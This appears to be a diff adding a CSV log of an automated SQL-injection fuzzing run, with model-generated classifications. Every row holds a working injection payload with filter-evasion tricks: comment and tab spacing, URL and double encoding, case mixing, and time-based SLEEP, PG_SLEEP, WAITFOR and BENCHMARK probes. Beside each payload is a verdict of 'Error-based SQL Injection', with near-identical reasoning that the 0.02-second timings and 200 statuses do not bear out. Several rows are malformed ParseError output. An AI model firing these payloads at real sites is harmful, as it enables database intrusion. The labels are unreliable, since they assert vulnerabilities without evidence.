@@ -1,0 +1,28 @@
+payload,status,elapsed,classification,reasoning
+id'/**/OR/**/'a'>'a'#,200,0.02,Error-based SQL Injection,"Detected syntax error in response body, suggesting vulnerable to injection via unsanitized user input."
+ID%27 || %27A%27=%27A%27--,200,0.03,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+id%27%09%26%26%09WAITFOR%09DELAY%09%270%3A0%3A5%27--,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+id%27%20XOR%201%3D1/*,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+ID' AND 1%3D1/*,200,0.02,Error-based SQL Injection,"Detected syntax error in response body, likely due to injected code being treated as a comment."
+id%27/**/XOR/**/WAITFOR/**/DELAY/**/%270:0:5%27--+,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+id%27 && 1LIKE1/*,200,0.02,Error-based SQL Injection,"Detected a syntax error in the response body, suggesting successful injection and potential database access vulnerability."
+id%27 && %27a%27LIKE%27a%27#,200,0.02,Error-based SQL Injection,"Detected a syntax error in the response body, suggesting successful injection."
+id' aNd 'A'IN'a'--,200,0.02,ParseError,"{""classification"": ""Error-based SQL Injection"",  “reasoning”: “Detected MySQL syntax error in the response body, indicating successful injection and potential for further exploitation.”}"
+ID%27%20OR%20PG_SLEEP%285%29--,200,0.02,Error-based SQL Injection,"Detected 'sleep' function call in the response body, suggesting vulnerable to error based injection."
+ID%27 AND SLEEP(5)/*!,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential database interaction.
+id%2527%2520AND%2520%2527a%2527IN%2527a%2527#,200,0.02,Error-based SQL Injection,"Detected syntax error in response body, suggesting successful injection."
+id%27%20%7C%7C%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+id%27%20AND%201lIkE1/*,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+ID' XOR 1=1#,200,0.03,Error-based SQL Injection,"Detected unexpected and sensitive information in the response body, suggesting potential database access manipulation."
+Id' xoR waitFOR dElAY '0:0:5'/*,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential for injection vulnerability.
+id%27	XOR	1IN1/*!,200,0.02,Error-based SQL Injection,Detected unexpected and syntax error related to user input in the response body.
+id%27%20%7C%7C%20BENCHMARK%2810000000%2CMD5%28NOW%28%29%29%29--,200,0.02,ParseError,"{   ""classification"": ""Error-based SQL Injection"",  }"
+id'	||	'a'%3D'a'--,200,0.02,ParseError,"{ ""classification"":  ""Error-based SQL Injection"",   “reasoning”: “Detected MySQL syntax error in the response body due to injected payload.” }"
+id' and 1like1/*,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+Id' oR SleEP(5)--+,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+ID' && 'A'<'a'/*,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+id%27%20AND%20%27a%27IN%27a%27/*,200,0.02,Error-based SQL Injection,"Detected syntax error in response body, suggesting successful injection and potential for further exploitation."
+id'%20&&%20pg_sleep(5)/*,200,0.02,Error-based SQL Injection,"Detected syntax error in response body, likely due to injected code execution."
+id'/**/OR/**/'a'!='a'/*,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating successful injection and potential for further exploitation.
+id%27 XOR 1%3D1/*,200,0.02,Error-based SQL Injection,Detected syntax error in response body indicating potential injection vulnerability.
+Id' || 'a'<'A'#,200,0.02,Error-based SQL Injection,Detected unexpected and syntax error related to user input in the response body.
